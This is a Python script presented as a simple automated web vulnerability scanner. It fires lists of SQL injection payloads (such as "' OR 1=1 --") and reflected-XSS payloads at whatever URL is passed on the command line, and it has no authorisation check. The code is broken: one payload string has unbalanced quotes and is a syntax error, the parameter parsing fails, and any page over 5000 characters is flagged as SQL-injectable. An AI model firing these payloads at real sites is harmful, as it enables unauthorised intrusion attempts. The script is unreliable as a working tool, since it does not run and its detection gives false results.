import requests
from bs4 import BeautifulSoup
import argparse
import time

# --- CONFIGURATION ---

# Define common vulnerability payloads
SQLI_PAYLOADS = [
    "' OR 1=1 --", 
    "' OR 'a'='a", 
    "\" OR 1=1 --",
    "admin' --"
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "'"><script>alert(1)</script>",
    "\" onmouseover=\"alert(1)\""
]

# --- CORE FUNCTIONS ---

def check_sqli(url, param_name, base_url):
    """Tests a specific parameter for SQL Injection."""
    print(f"  -> Testing SQLi on parameter: {param_name}")

    # Create the initial URL structure to test against
    test_url = base_url.split('?')[0]

    for payload in SQLI_PAYLOADS:
        # Simple simulation: assuming GET request structure
        params = dict(base_url.split('?')[-1].split('&'))

        # Test the payload by replacing the original value or appending
        original_value = params.get(param_name, 'default')
        params[param_name] = payload

        try:
            response = requests.get(test_url, params=params, timeout=10)

            # Heuristic check for SQLi: Is the response significantly different (indicating error/success)
            # A real scanner would check HTTP status codes, content length, or error messages.
            if "SQL syntax" in response.text or len(response.text) > 5000:
                print(f"  [!!!] VULNERABLE: {param_name} triggered SQL Error/Anomaly.")
                return True

        except requests.exceptions.RequestException as e:
            print(f"  [!] Error during SQLi test: {e}")

    return False

def check_xss(url, input_field_id, base_url):
    """Tests a specific input field for Cross-Site Scripting."""
    print(f"  -> Testing XSS on input field ID: {input_field_id}")

    # Note: This assumes a POST request if it's a form submission, or GET if it's a query parameter.
    # We'll simulate a POST request for a form submission example.

    for payload in XSS_PAYLOADS:
        # In a real scenario, you would submit this payload to the form action URL
        # For simplicity, we'll just append it to the base URL as a query parameter
        params = dict(base_url.split('?')[-1].split('&'))
        params['input'] = payload

        try:
            response = requests.get(base_url, params=params, timeout=10)

            # Heuristic check for XSS: Check if the injected script tag is reflected in the page body
            if "<script>alert('XSS')</script>" in response.text:
                 print(f"  [!!!] VULNERABLE: XSS detected via input field {input_field_id}. Payload reflected.")
                 return True

        except requests.exceptions.RequestException as e:
            print(f"  [!] Error during XSS test: {e}")

    return False


def scan_website(target_url: str):
    """Main function to crawl and test the target website."""
    print("-" * 50)
    print(f"🚀 STARTING SCAN on: {target_url}")
    print("-" * 50)

    try:
        # Initial fetch to get the site structure (for crawling/identifying fields)
        initial_response = requests.get(target_url, timeout=15)
        initial_response.raise_for_status()

        soup = BeautifulSoup(initial_response.content, 'html.parser')

        # --- Simulated Discovery/Identification ---
        print("[INFO] Analyzing site structure...")

        # 1. Scan URL Parameters (for GET-based injection)
        # This is a basic parsing of the URL to find query parameters
        from urllib.parse import urlparse, parse_qs
        parsed_url = urlparse(target_url)
        query_params = parse_qs(parsed_url.query)

        print(f"\n[ANALYSIS] Found {len(query_params)} potential GET parameters.")
        for param_name in query_params:
            # We need the base URL without the existing params for cleaner injection testing
            base_url = target_url.split('&')[0] if '?' in target_url else target_url
            check_sqli(target_url, param_name, base_url)

        # 2. Scan Form Fields (for POST-based injection)
        # We look for common input fields ID or Name attributes
        form_fields = soup.find_all(['input', 'textarea'])
        print(f"\n[ANALYSIS] Found {len(form_fields)} potential form input fields.")

        # Example: Target a specific field ID if known, otherwise test the first one found
        specific_field_id = 'username' # <<< CHANGE THIS TO A REAL FIELD ID
        if specific_field_id in [f['id'] for f in form_fields if 'id' in f.attrs]:
             # Re-fetch the page to ensure we have the latest content for the XSS test
             check_xss(target_url, specific_field_id, target_url)
        else:
             print("[WARN] Could not find a specific field ID; skipping deep XSS test.")


    except requests.exceptions.RequestException as e:
        print(f"\n[FATAL ERROR] Could not connect to the target site: {e}")

    print("\n" + "=" * 50)
    print("SCAN COMPLETE")
    print("=" * 50)

# --- EXECUTION BLOCK ---

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="DIG's Automated Web Vulnerability Scanner Framework.",
        epilog="Example: python scanner.py https://example.com/login?id=1"
    )
    parser.add_argument("url", type=str, help="The full URL of the website to scan.")

    args = parser.parse_args()

    # Ensure the URL has a scheme for requests to work
    if not args.url.startswith('http'):
        args.url = 'http://' + args.url

    scan_website(args.url)
